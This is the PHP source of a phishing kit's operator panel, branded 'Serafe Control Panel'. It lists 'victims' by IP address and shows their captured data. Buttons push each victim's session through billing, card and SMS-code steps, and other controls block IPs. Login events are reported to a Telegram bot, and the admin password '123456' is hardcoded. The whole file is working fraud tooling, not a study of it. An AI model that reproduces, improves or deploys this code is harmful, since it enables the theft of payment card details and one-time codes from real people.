<?php
session_start();
require_once "../config.php";
$admin_password = "123456";

function send_admin_notification($message) {
    global $api_key, $chat_id;
    if (isset($api_key) && isset($chat_id) && !empty($api_key)) {
        $url = "https://api.telegram.org/bot{$api_key}/sendMessage";
        $data = http_build_query([
            'chat_id' => $chat_id,
            'text' => $message,
            'parse_mode' => 'HTML'
        ]);
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_TIMEOUT => 10
        ]);
        curl_exec($ch);
        curl_close($ch);
    }
}

if (!isset($_SESSION['admin_logged_in'])) {
    if (isset($_POST['pass'])) {
        if ($_POST['pass'] === $admin_password) {
            $_SESSION['admin_logged_in'] = true;
            $ip = $_SERVER['REMOTE_ADDR'];
            $msg = "✅ Control Panel Login\n🔑 Successfull login\n🌍 IP: $ip\n🕐 Time: " . date('Y-m-d H:i:s');
            send_admin_notification($msg);
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
            $pass_attempt = htmlspecialchars($_POST['pass']);
            $msg = "❌ Control Panel Login Failed\n🔑 Wrong password: $pass_attempt\n🌍 IP: $ip\n🕐 Time: " . date('Y-m-d H:i:s');
            send_admin_notification($msg);
            echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes"><title>Access Denied</title>
            <style>*{margin:0;padding:0;box-sizing:border-box;}body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);font-family:"Segoe UI",Arial,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px;} .login-card{background:white;border-radius:20px;padding:30px 20px;width:100%;max-width:400px;box-shadow:0 20px 60px rgba(0,0,0,0.3);text-align:center;} h2{color:#e74c3c;margin-bottom:20px;font-size:1.8rem;} input{width:100%;padding:15px;margin:10px 0;border:2px solid #ddd;border-radius:10px;font-size:16px;} button{width:100%;padding:15px;background:#e74c3c;color:white;border:none;border-radius:10px;font-size:16px;cursor:pointer;}</style></head><body>
            <div class="login-card"><h2>⚠️ ACCESS DENIED</h2><form method="post"><input type="password" name="pass" placeholder="Enter Password" required><button type="submit">Authenticate</button></form></div></body></html>';
            exit;
        }
    } else {
        echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes"><title>Control Panel</title>
        <style>*{margin:0;padding:0;box-sizing:border-box;}body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);font-family:"Segoe UI",Arial,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px;} .login-card{background:white;border-radius:20px;padding:30px 20px;width:100%;max-width:400px;box-shadow:0 20px 60px rgba(0,0,0,0.3);text-align:center;} h2{color:#667eea;margin-bottom:20px;font-size:1.8rem;} input{width:100%;padding:15px;margin:10px 0;border:2px solid #ddd;border-radius:10px;font-size:16px;} button{width:100%;padding:15px;background:#667eea;color:white;border:none;border-radius:10px;font-size:16px;cursor:pointer;}</style></head><body>
        <div class="login-card"><h2>🎮 Control Panel</h2><form method="post"><input type="password" name="pass" placeholder="Enter Password" required><button type="submit">Enter</button></form></div></body></html>';
        exit;
    }
}

$vics_dir = 'vics/';
if (!is_dir($vics_dir)) mkdir($vics_dir, 0755, true);

$block_file = 'blocked_ips.txt';
if (!file_exists($block_file)) file_put_contents($block_file, '');

function is_ip_blocked($ip) {
    global $block_file;
    $blocked = file($block_file, FILE_IGNORE_NEW_LINES);
    return in_array($ip, $blocked);
}

function block_ip($ip) {
    global $block_file;
    if (!is_ip_blocked($ip)) {
        file_put_contents($block_file, $ip . "\n", FILE_APPEND);
        return true;
    }
    return false;
}

function unblock_ip($ip) {
    global $block_file;
    $blocked = file($block_file, FILE_IGNORE_NEW_LINES);
    $blocked = array_filter($blocked, function($b) use ($ip) { return trim($b) !== trim($ip); });
    file_put_contents($block_file, implode("\n", $blocked));
    return true;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['ip']) && isset($_POST['force_to'])) {
    $ip = preg_replace('/[^0-9a-f\.:]/i', '', $_POST['ip']);
    $file = $vics_dir . $ip . '.txt';
    $step = $_POST['force_to'];
    $old_content = file_exists($file) ? file_get_contents($file) : '';
    $old_lines = explode("\n", $old_content);
    $old_data = '';
    if (count($old_lines) > 1) $old_data = implode("\n", array_slice($old_lines, 1));
    $new_content = $step . "\n" . $old_data;
    if (file_put_contents($file, $new_content)) $msg = "✅ Victim $ip → forced to: $step";
    else $msg = "❌ Victim $ip → failed to write";
    header("Location: control.php?msg=" . urlencode($msg));
    exit;
}

if (isset($_GET['block'])) {
    $ip = preg_replace('/[^0-9a-f\.:]/i', '', $_GET['block']);
    if (block_ip($ip)) {
        $file = $vics_dir . $ip . '.txt';
        if (file_exists($file)) {
            $old_content = file_get_contents($file);
            $old_lines = explode("\n", $old_content);
            $old_data = '';
            if (count($old_lines) > 1) $old_data = implode("\n", array_slice($old_lines, 1));
            file_put_contents($file, "block\n" . $old_data);
        }
        $msg = "🚫 IP $ip has been blocked";
    } else $msg = "⚠️ IP $ip is already blocked";
    header("Location: control.php?msg=" . urlencode($msg));
    exit;
}

if (isset($_GET['unblock'])) {
    $ip = preg_replace('/[^0-9a-f\.:]/i', '', $_GET['unblock']);
    unblock_ip($ip);
    $msg = "🔓 IP $ip has been unblocked";
    header("Location: control.php?msg=" . urlencode($msg));
    exit;
}

$victims = [];
foreach (glob($vics_dir . '*.txt') as $f) {
    $ip = basename($f, '.txt');
    $content = file_get_contents($f);
    $last_activity = filemtime($f);
    $victims[$ip] = ['data' => $content, 'last_activity' => $last_activity];
}

$blocked_ips = file($block_file, FILE_IGNORE_NEW_LINES);
$blocked_ips = array_filter($blocked_ips);
$msg = $_GET['msg'] ?? '';
?>

<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
<title>Serafe Control Panel</title>
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
        font-family: 'Segoe UI', Arial, sans-serif;
        background: linear-gradient(135deg, #0d5c5c 0%, #0f6b6b 100%);
        min-height: 100vh;
        padding: 16px;
    }
    .container { max-width: 1400px; margin: 0 auto; }
    .header {
        background: white;
        border-radius: 20px;
        padding: 20px 20px;
        margin-bottom: 20px;
        box-shadow: 0 10px 40px rgba(0,0,0,0.1);
    }
    .header h1 { font-size: 28px; color: #0d5c5c; margin-bottom: 8px; word-break: break-word; }
    .stats-grid {
        display: flex;
        flex-wrap: wrap;
        gap: 15px;
        margin-top: 15px;
    }
    .stat-card {
        background: #f8f9fa;
        border-radius: 15px;
        padding: 12px 16px;
        text-align: center;
        flex: 1 1 calc(33% - 15px);
        min-width: 100px;
    }
    .stat-card .number { font-size: 28px; font-weight: bold; color: #0d5c5c; }
    .stat-card .label { font-size: 13px; color: #666; margin-top: 5px; }
    .msg {
        background: #d4edda;
        color: #155724;
        border: 1px solid #c3e6cb;
        border-radius: 12px;
        padding: 12px 16px;
        margin-bottom: 20px;
        text-align: center;
        font-size: 14px;
        word-break: break-word;
    }
    .victims-table {
        background: white;
        border-radius: 20px;
        overflow: hidden;
        box-shadow: 0 10px 40px rgba(0,0,0,0.1);
        margin-bottom: 25px;
    }
    .victims-table h2 {
        padding: 16px 20px;
        background: #f8f9fa;
        font-size: 18px;
        border-bottom: 2px solid #e9ecef;
    }
    .table-wrapper {
        overflow-x: auto;
        -webkit-overflow-scrolling: touch;
    }
    table { 
        width: 100%; 
        border-collapse: collapse;
        min-width: 700px;
    }
    th {
        background: #0d5c5c;
        color: white;
        padding: 12px 10px;
        font-weight: 600;
        font-size: 13px;
        text-align: left;
    }
    td { padding: 12px 10px; border-bottom: 1px solid #e9ecef; vertical-align: middle; }
    tr:hover { background: #f8f9fa; }
    .status-badge {
        display: inline-block;
        width: 10px;
        height: 10px;
        border-radius: 50%;
        margin-right: 8px;
    }
    .status-online { background: #28a745; box-shadow: 0 0 5px #28a745; animation: pulse 2s infinite; }
    .status-offline { background: #dc3545; }
    @keyframes pulse {
        0% { opacity: 0.5; transform: scale(1); }
        100% { opacity: 1; transform: scale(1.2); }
    }
    .step-badge {
        display: inline-block;
        padding: 5px 12px;
        border-radius: 20px;
        font-size: 11px;
        font-weight: 600;
        white-space: nowrap;
    }
    .step-wait { background: #e9ecef; color: #6c757d; }
    .step-billing { background: #17a2b8; color: white; }
    .step-card { background: #e67e22; color: white; }
    .step-sms { background: #c0392b; color: white; }
    .step-tan { background: #8e44ad; color: white; }
    .step-block { background: #dc3545; color: white; }
    .step-success { background: #28a745; color: white; }
    .btn-group { 
        display: flex; 
        flex-wrap: wrap; 
        gap: 8px; 
        margin-bottom: 8px;
    }
    .btn {
        padding: 6px 12px;
        border: none;
        border-radius: 8px;
        font-size: 12px;
        font-weight: 600;
        cursor: pointer;
        transition: all 0.3s;
        text-decoration: none;
        display: inline-block;
        text-align: center;
        white-space: nowrap;
    }
    @media (max-width: 600px) {
        .btn {
            white-space: normal;
            font-size: 11px;
            padding: 6px 8px;
        }
    }
    .btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
    .btn-wait { background: #6c757d; color: white; }
    .btn-billing { background: #17a2b8; color: white; }
    .btn-card { background: #e67e22; color: white; }
    .btn-sms { background: #c0392b; color: white; }
    .btn-tan { background: #8e44ad; color: white; }
    .btn-done { background: #28a745; color: white; }
    .btn-reset { background: #17a2b8; color: white; }
    .btn-block { background: #dc3545; color: white; }
    .btn-unblock { background: #ffc107; color: #333; }
    pre {
        background: #f8f9fa;
        padding: 6px;
        border-radius: 8px;
        font-size: 10px;
        margin: 0;
        overflow-x: auto;
        max-height: 70px;
        font-family: monospace;
        white-space: pre-wrap;
        word-break: break-all;
    }
    .ip-cell { font-family: monospace; font-weight: 600; word-break: break-all; }
    .last-active { font-size: 10px; color: #888; margin-top: 5px; }
    .blocked-section {
        background: white;
        border-radius: 20px;
        padding: 16px 20px;
        box-shadow: 0 10px 40px rgba(0,0,0,0.1);
    }
    .blocked-section h3 { color: #333; margin-bottom: 15px; font-size: 18px; }
    .blocked-ips { display: flex; flex-wrap: wrap; gap: 10px; }
    .blocked-ip {
        background: #f8f9fa;
        padding: 6px 12px;
        border-radius: 20px;
        display: inline-flex;
        align-items: center;
        flex-wrap: wrap;
        gap: 8px;
        font-family: monospace;
        font-size: 13px;
    }
    .no-victims { text-align: center; padding: 40px 20px; color: #888; }
    @media (max-width: 480px) {
        body { padding: 10px; }
        .header h1 { font-size: 24px; }
        .stat-card .number { font-size: 22px; }
        .step-badge { font-size: 10px; padding: 4px 8px; white-space: normal; }
        td, th { padding: 8px 6px; }
        .btn { padding: 5px 8px; font-size: 10px; }
        .blocked-ip { font-size: 11px; }
    }
</style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>🎮 Serafe Control Panel</h1>
        <div class="stats-grid">
            <div class="stat-card"><div class="number"><?= count($victims) ?></div><div class="label">Active Victims</div></div>
            <div class="stat-card"><div class="number"><?= count($blocked_ips) ?></div><div class="label">Blocked IPs</div></div>
            <div class="stat-card"><div class="number"><?= date('H:i:s') ?></div><div class="label">Last Update</div></div>
        </div>
    </div>
    
    <?php if ($msg): ?>
        <div class="msg"><?= htmlspecialchars($msg) ?></div>
    <?php endif; ?>
    
    <div class="victims-table">
        <h2>📊 Active Sessions</h2>
        <?php if (empty($victims)): ?>
            <div class="no-victims">😴 No victims detected yet. Waiting for connections...</div>
        <?php else: ?>
            <div class="table-wrapper">
                <table>
                    <thead>
                        <tr><th>IP Address</th><th>Status</th><th>Current Step</th><th>Captured Data</th><th>Actions</th></tr>
                    </thead>
                    <tbody>
                        <?php foreach ($victims as $ip => $info): ?>
                            <?php
                            $data = $info['data'];
                            $last_active = $info['last_activity'];
                            $is_online = (time() - $last_active) < 60;
                            $is_blocked = is_ip_blocked($ip);
                            $lines = explode("\n", $data);
                            $step = trim($lines[0]);
                            $step_class = '';
                            $step_text = '';
                            switch ($step) {
                                case 'billing': $step_class = 'step-billing'; $step_text = '📋 app'; break;
                                case 'card': $step_class = 'step-card'; $step_text = '💳 CARD'; break;
                                case 'sms': $step_class = 'step-sms'; $step_text = '📱 SMS'; break;
                                case 'success': $step_class = 'step-success'; $step_text = '✅ SUCCESS'; break;
                                case 'reset': $step_class = 'step-reset'; $step_text = '🔄 RESET'; break;
                                case 'block': $step_class = 'step-block'; $step_text = '🚫 BLOCKED'; break;
                                default: $step_class = 'step-wait'; $step_text = '⏳ WAIT';
                            }
                            $captured_data = count($lines) > 1 ? implode("\n", array_slice($lines, 1)) : '';
                            $time_ago = round((time() - $last_active) / 60);
                            ?>
                            <tr>
                                <td class="ip-cell"><?= htmlspecialchars($ip) ?><div class="last-active">last activity: <?= $time_ago ?> min ago</div></td>
                                <td><span class="status-badge <?= $is_online ? 'status-online' : 'status-offline' ?>"></span><?= $is_online ? 'ONLINE' : 'OFFLINE' ?><?php if ($is_blocked): ?><br><span style="color:#dc3545; font-size:11px;">🚫 BLOCKED</span><?php endif; ?></td>
                                <td><span class="step-badge <?= $step_class ?>"><?= $step_text ?></span></td>
                                <td><pre><?= htmlspecialchars(substr($captured_data, 0, 150)) ?></pre></td>
                                <td>
                                    <form method="post" style="display: inline;">
                                        <input type="hidden" name="ip" value="<?= htmlspecialchars($ip) ?>">
                                        <div class="btn-group">
                                            <button type="submit" name="force_to" value="wait" class="btn btn-wait">⏳ Wait</button>
                                            <button type="submit" name="force_to" value="billing" class="btn btn-billing">📋 app</button>
                                            <button type="submit" name="force_to" value="card" class="btn btn-card">💳 Card</button>
                                            <button type="submit" name="force_to" value="sms" class="btn btn-sms">📱 SMS</button>
                                            <button type="submit" name="force_to" value="success" class="btn btn-done">✅ Done</button>
                                            <button type="submit" name="force_to" value="reset" class="btn btn-reset">🔄 Reset</button>
                                        </div>
                                    </form>
                                    <div class="btn-group" style="margin-top: 8px;">
                                        <?php if (!$is_blocked): ?>
                                            <a href="?block=<?= urlencode($ip) ?>" class="btn btn-block" onclick="return confirm('Block IP <?= htmlspecialchars($ip) ?>?')">🚫 Block IP</a>
                                        <?php else: ?>
                                            <a href="?unblock=<?= urlencode($ip) ?>" class="btn btn-unblock" onclick="return confirm('Unblock IP <?= htmlspecialchars($ip) ?>?')">🔓 Unblock IP</a>
                                        <?php endif; ?>
                                    </div>
                                </td>
                            </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        <?php endif; ?>
    </div>
    
    <div class="blocked-section">
        <h3>🚫 Blocked IP Addresses</h3>
        <div class="blocked-ips">
            <?php if (empty($blocked_ips)): ?>
                <span style="color:#888;">No blocked IPs</span>
            <?php else: ?>
                <?php foreach ($blocked_ips as $blocked_ip): ?>
                    <div class="blocked-ip">
                        <?= htmlspecialchars($blocked_ip) ?>
                        <a href="?unblock=<?= urlencode($blocked_ip) ?>" class="btn btn-unblock" style="padding: 2px 8px; font-size: 10px;">Unblock</a>
                    </div>
                <?php endforeach; ?>
            <?php endif; ?>
        </div>
    </div>
</div>
</body>
</html>
